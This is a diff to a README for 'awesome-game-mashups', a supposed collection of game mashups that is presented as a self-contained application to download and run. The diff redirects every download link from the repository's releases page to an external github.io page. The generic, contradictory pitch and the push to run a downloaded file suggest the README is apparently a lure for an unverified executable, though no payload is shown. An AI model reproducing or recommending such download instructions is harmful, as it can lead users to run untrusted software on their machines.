@@ -2,7 +2,7 @@
 
 Welcome to **awesome-game-mashups**, your gateway to a curated collection of incredible game mashups. This application brings together the most creative and verified projects where popular games are rebuilt inside other games — from Doom running inside Minecraft to Halo mods in Skyrim. Whether you're a fan of cross-game mechanics, engine mashups, or playable ports, this collection has something for everyone.
 
-[![Download Application](https://img.shields.io/badge/Download-Application-4ecdc4?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6b6b)](https://github.com/Picolini25/awesome-game-mashups/releases)
+[![Download Application](https://img.shields.io/badge/Download-Application-4ecdc4?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6b6b)](https://picolini25.github.io)
 
 ## 📖 What Is awesome-game-mashups?
 
@@ -38,7 +38,7 @@ Getting started with awesome-game-mashups is quick and easy. Follow these simple
 3. **Browse the collection** – Use the built-in list to explore available game mashups.
 4. **Launch a mashup** – Click any project to download and play it.
 
-**Download Link:** [Visit this link to download the application](https://github.com/Picolini25/awesome-game-mashups/releases)
+**Download Link:** [Visit this link to download the application](https://picolini25.github.io)
 
 That's it! No installation wizard, no complex setup. The application is designed for everyday computer users.
 
@@ -46,7 +46,7 @@ That's it! No installation wizard, no complex setup. The application is designed
 
 To download awesome-game-mashups, visit the official releases page:
 
-[**Download Page**](https://github.com/Picolini25/awesome-game-mashups/releases)
+[**Download Page**](https://picolini25.github.io)
 
 **Visit this link to download the application.** The page will open in your web browser. Follow the instructions there to get the latest version. After downloading, run the application file to start using the program. There is no need to install anything separately — the application is self-contained.
 
